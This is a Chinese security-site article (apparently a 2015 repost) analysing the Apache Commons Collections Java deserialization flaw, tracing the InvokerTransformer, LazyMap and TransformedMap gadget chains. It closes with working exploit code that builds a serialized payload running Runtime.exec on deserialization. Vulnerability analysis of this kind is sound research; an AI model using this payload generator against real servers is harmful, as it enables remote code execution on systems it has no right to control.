<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="JAVA,Apache,CommonsCollections,序列化,漏洞,分析,高级,利用"/>
    
        <meta name="description" content="本文主要讨论Apache CommonsCollections组件的Deserialize功能存在的问题。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>JAVA Apache-CommonsCollections 序列化漏洞分析以及漏洞高级利用</h2>
                <div class="article-msg">
                    <span class="time">2015-11-17 11:29:01</span>
                                        <span class="read">阅读：27031次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_2268"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="2268" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/"
                             target="_blank">来源： iswin</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><img src="http://p6.qhimg.com/t0163a3b143fdc96b79.jpg" title="t01bef7c8522e324cdb.jpg" alt="http://p1.qhimg.com/t01bef7c8522e324cdb.jpg"/></span></p><blockquote style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0.65em 0px 0.65em 10.765625px; padding: 0px 0px 0px 10.765625px; border-width: 0px 0px 0px 0.2em; border-left-style: solid; border-left-color: rgb(44, 166, 203); outline: 0px; vertical-align: baseline; line-height: 1.5; color: rgb(128, 128, 128); white-space: normal; text-indent: 2em; text-align: left; background-color: rgb(250, 250, 250);"><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">本文主要讨论Apache CommonsCollections组件的Deserialize功能存在的问题,该问题其实在2015年1月份在国外已经被发现,直到在今年11月初才被国内相关网站发现并且在安全圈子里面迅速升温,不少安全公司已经采用批量化的程序对互联网上受影响的网站进行检测,由于CommonsCollections为Apache开源项目的重要组件,所以该组建的使用量非常大,这次主要是JBOSS,weblogic等中间件受影响,通过对漏洞的POC进行修改,可以直接控制受影响的服务器。</span></p></blockquote><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">漏洞原理分析</span></strong></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">该漏洞的出现的根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验,新版本的修复方案对相关反射调用进行了限制。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">问题函数主要出现在org.apache.commons.collections.Transformer接口上,我们可以看到该接口值定义了一个方法</span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/transformer_interface.png" title="" rel="article0"><img src="http://p4.qhimg.com/t01f26d982748c23b26.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320" width="820"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">我们可以看到该方法的作用是给定一个Object对象经过转换后同时也返回一个Object,我们来看看该接口有哪些实现类</span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/implements-transformer.png" title="" rel="article0"><img src="http://p2.qhimg.com/t019797407ab73b0ff2.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这些transformer的实现类中,我们一眼就看到了这里的InvokerTransformer,搞JAVA的对invoke这个词应该比较敏感,我们跟进这个实现类去看看具体的实现,</span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/invokeTransformer.png" title="" rel="article0"><img src="http://p7.qhimg.com/t0150d3a7cf4b4b105a.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">我们可以看到该该方法中采用了反射的方法进行函数调用,Input参数为要进行反射的对象(反射相关的知识就不在这赘述了),iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型,iArgs为对应方法的参数,在invokeTransformer这个类的构造函数中我们可以发现,这三个参数均为可控参数</span></p><pre class="brush:java;toolbar:false">public&nbsp;InvokerTransformer(String&nbsp;methodName,&nbsp;Class[]&nbsp;paramTypes,&nbsp;Object[]&nbsp;args)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iMethodName&nbsp;=&nbsp;methodName;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iParamTypes&nbsp;=&nbsp;paramTypes;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iArgs&nbsp;=&nbsp;args;
&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">那么现在核心的问题就是寻找哪些类调用了Transformer接口中的transform方法,通过eclipse我们找到了以下类调用了该方法</span><br/></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/transformermap.png" title="" rel="article0"><img src="http://p3.qhimg.com/t01b9dfeef9ae405230.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里我们可以看到有两个比较明显的类调用了transform方法,分别是</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">LazyMap</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">TransformedMap</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">LazyMap构造POC</span></strong></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里对于网上给出的POC使用的是LazyMap来进行构造,其实这里TransformedMap构造更为简单,因为触发条件比较简单,后面会具体分析。<br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/>这里以网上给出的</span><a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="external" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline; font-size: 14px;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">POC</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">来进行分析,毕竟大家都在用么。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里LazyMap实现了Map接口,其中的get(Object)方法调用了transform方法,跟进函数进去</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;"></span></p><pre class="brush:java;toolbar:false">public&nbsp;Object&nbsp;get(Object&nbsp;key)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;create&nbsp;value&nbsp;for&nbsp;key&nbsp;if&nbsp;key&nbsp;is&nbsp;not&nbsp;currently&nbsp;in&nbsp;the&nbsp;map
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(map.containsKey(key)&nbsp;==&nbsp;false)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object&nbsp;value&nbsp;=&nbsp;factory.transform(key);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map.put(key,&nbsp;value);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;value;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;map.get(key);
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">这里可以看到,在调用transform方法之前会先判断当前Map中是否已经有该key,如果没有最终会由这里的factory.transform进行处理,我吗继续跟踪下facory这个变量看看该变量是再哪被初始化的,</span></p><pre class="brush:java;toolbar:false">public&nbsp;static&nbsp;Map&nbsp;decorate(Map&nbsp;map,&nbsp;Transformer&nbsp;factory)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;LazyMap(map,&nbsp;factory);
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">这里的decorate方法会对factory进行初始化,同时实例化一个LazyMap,到这里就比较有意思了。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">为了能成功调用transform方法,我们找到了LazyMap方法,发现在get()方法中调用了该方法,所以说现在漏洞利用的核心条件就是去寻找一个类,在对象进行反序列化时会调用我们精心构造对象的get(Object)方法,老外在这里找到了一个方法的确能在反序列化时触发LazyMap的get(Object)方法,老外的这种精神必须佩服!</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">现在重点现在转移到sun.reflect.annotation.AnnotationInvocationHandler类上,我们看看在该类进行反序列化的时候究竟是如何触发漏洞代码的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">跟进sun.reflect.annotation.AnnotationInvocationHandler的源代码</span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/AnnotationInvocationHandler.png" title="" rel="article0"><img src="http://p1.qhimg.com/t01702edc95f2aa7d8c.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">在反序列的时候程序首先会调用调用readObject这个方法,我们首先看看这个readObject方法</span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/readObject.png" title="" rel="article0"><img src="http://p3.qhimg.com/t015a4f6c2f435ce8ae.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里的memberValues是我们通过构造AnnotationInvocationHandler 构造函数初始化的变量,也就是我们构造的lazymap对象,这里我们只需要找到一个memberValues.get(Object)的方法即可触发该漏洞,但是可惜的是该方法里面并没有这个方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">到这里,在老外给的POC里面,有一个Proxy.newInstance(xx)的方法,很多人可能不太明白老外为什么这里需要用到动态代理,这里也就是POC的精华之处了,我们在readObject方法中并未找到lazymap的get方法,但是我们继续在sun.reflect.annotation.AnnotationInvocationHandler类里面找看看那个方法调用了memberValues.get(Object)方法,很幸运我们发现在invoke方法中memberValues.get(Object)被调用</span></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/invoke-poc.png" title="" rel="article0"><img src="http://p2.qhimg.com/t016333dc2baf7024ef.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里大家应该能明白老外为什么要用动态代理来进行构造POC了,因为AnnotationInvocationHandler默认实现了InvocationHandler接口,在用Object iswin=Proxy.newInstance(classloader,interface,InvocationHandler)生成动态代理后,当对象iswin在进行对象调用时,那么就会调用InvocationHandler.invoke(xx)方法,所以POC的执行流程为map.xx-&gt;proxy(Map).invoke-&gt;lazymap.get(xx) 就会触发transform方法从而执行恶意代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里的ChainedTransformer为链式的Transformer,会挨个执行我们定义的Transformer,这里比较简单,有兴趣自己去看源码就知道。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">TransformedMap构造POC</span><br/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里如果使用TransformedMap来进行POC的构造就非常简单了,我们跟进TransformedMap的checkSetValue方法</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:java;toolbar:false">protected&nbsp;Object&nbsp;checkSetValue(Object&nbsp;value)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;valueTransformer.transform(value);
&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; text-indent: 2em;">我们继续看checkSetValue被那个函数所调用,在MapEntry类中的setValue恰好调用了checkSetValue,这里直接触发了tranform函数,用TransformedMap来构造POC为什么说比LazyMap好呢,那是因为这里触发的条件比较简单,我们可以在sun.reflect.annotation.AnnotationInvocationHandler中的readObject(xxx)</span><br/></p><p style="text-align: center;"><a href="http://www.iswin.org/attach/readObject.png" title="" rel="article0"><img src="http://p3.qhimg.com/t015a4f6c2f435ce8ae.jpg" style="-webkit-margin-before: 0px; -webkit-margin-after: 0px; margin: 0px; padding: 0.7em 0px 0px; border: none; outline: 0px; font-weight: inherit; font-style: inherit; vertical-align: middle; max-width: 100%; height: auto;" height="320"/></a></p><p><br style="-webkit-margin-before: 0px; -webkit-margin-after: 0px;"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">这里我们明显可以看到memberValue.setValue(xxx)方法,所以我们只需要构造一个不为空的TransformedMap,在AnnotationInvocationHandler.readObject(xx)事就会触发漏洞,需要注意,这里的触发的类为AnnotationInvocationHandler,在触发漏洞事会对type进行检查,所以在transformer的时候我们要讲type设置为annotation类型。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">所以这里POC执行流程为TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()-&gt;checkSetValue()漏洞成功触发。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(255, 0, 0);">利用代码</span></strong></p><pre class="brush:java;toolbar:false">import&nbsp;java.io.File;
import&nbsp;java.io.FileInputStream;
import&nbsp;java.io.FileNotFoundException;
import&nbsp;java.io.FileOutputStream;
import&nbsp;java.io.IOException;
import&nbsp;java.io.ObjectInputStream;
import&nbsp;java.io.ObjectOutputStream;
import&nbsp;java.lang.annotation.Retention;
import&nbsp;java.lang.reflect.Constructor;
import&nbsp;java.util.HashMap;
import&nbsp;java.util.Map;
import&nbsp;java.util.Map.Entry;
import&nbsp;org.apache.commons.collections.Transformer;
import&nbsp;org.apache.commons.collections.functors.ChainedTransformer;
import&nbsp;org.apache.commons.collections.functors.ConstantTransformer;
import&nbsp;org.apache.commons.collections.functors.InvokerTransformer;
import&nbsp;org.apache.commons.collections.map.TransformedMap;
/**
&nbsp;*&nbsp;@ClassName:&nbsp;Main.java
&nbsp;*&nbsp;@Description:&nbsp;TODO
&nbsp;*&nbsp;@author&nbsp;iswin
&nbsp;*&nbsp;@email&nbsp;admin@iswin.org
&nbsp;*&nbsp;@Date&nbsp;2015年11月8日&nbsp;下午12:12:13
&nbsp;*/
public&nbsp;class&nbsp;Main&nbsp;{
public&nbsp;static&nbsp;Object&nbsp;Reverse_Payload(String&nbsp;execArgs)&nbsp;throws&nbsp;Exception&nbsp;{
final&nbsp;Transformer[]&nbsp;transforms&nbsp;=&nbsp;new&nbsp;Transformer[]&nbsp;{
new&nbsp;ConstantTransformer(Runtime.class),
new&nbsp;InvokerTransformer(&quot;getMethod&quot;,&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;String.class,
Class[].class&nbsp;},&nbsp;new&nbsp;Object[]&nbsp;{&nbsp;&quot;getRuntime&quot;,
new&nbsp;Class[0]&nbsp;}),
new&nbsp;InvokerTransformer(&quot;invoke&quot;,&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;Object.class,
Object[].class&nbsp;},&nbsp;new&nbsp;Object[]&nbsp;{&nbsp;null,&nbsp;new&nbsp;Object[0]&nbsp;}),
new&nbsp;InvokerTransformer(&quot;exec&quot;,&nbsp;new&nbsp;Class[]&nbsp;{&nbsp;String.class&nbsp;},
execArgs),&nbsp;new&nbsp;ConstantTransformer(1)&nbsp;};
Transformer&nbsp;transformerChain&nbsp;=&nbsp;new&nbsp;ChainedTransformer(transforms);
Map&nbsp;innermap&nbsp;=&nbsp;new&nbsp;HashMap();
innermap.put(&quot;value&quot;,&nbsp;&quot;value&quot;);
Map&nbsp;outmap&nbsp;=&nbsp;TransformedMap.decorate(innermap,&nbsp;null,&nbsp;transformerChain);
Class&nbsp;cls&nbsp;=&nbsp;Class
.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
Constructor&nbsp;ctor&nbsp;=&nbsp;cls.getDeclaredConstructor(Class.class,&nbsp;Map.class);
ctor.setAccessible(true);
Object&nbsp;instance&nbsp;=&nbsp;ctor.newInstance(Retention.class,&nbsp;outmap);
return&nbsp;instance;
}
public&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;throws&nbsp;Exception&nbsp;{
GeneratePayload(Reverse_Payload(&quot;cmd&quot;),
&quot;/Users/iswin/Downloads/test.bin&quot;);
}
public&nbsp;static&nbsp;void&nbsp;GeneratePayload(Object&nbsp;instance,&nbsp;String&nbsp;file)
throws&nbsp;Exception&nbsp;{
File&nbsp;f&nbsp;=&nbsp;new&nbsp;File(file);
ObjectOutputStream&nbsp;out&nbsp;=&nbsp;new&nbsp;ObjectOutputStream(new&nbsp;FileOutputStream(f));
out.writeObject(instance);
out.flush();
out.close();
}
public&nbsp;static&nbsp;void&nbsp;payloadTest(String&nbsp;file)&nbsp;throws&nbsp;Exception&nbsp;{
//&nbsp;这里为测试上面的tansform是否会触发payload
//&nbsp;Map.Entry&nbsp;onlyElement&nbsp;=(Entry)&nbsp;outmap.entrySet().iterator().next();
//&nbsp;onlyElement.setValue(&quot;foobar&quot;);
ObjectInputStream&nbsp;in&nbsp;=&nbsp;new&nbsp;ObjectInputStream(new&nbsp;FileInputStream(file));
in.readObject();
in.close();
}
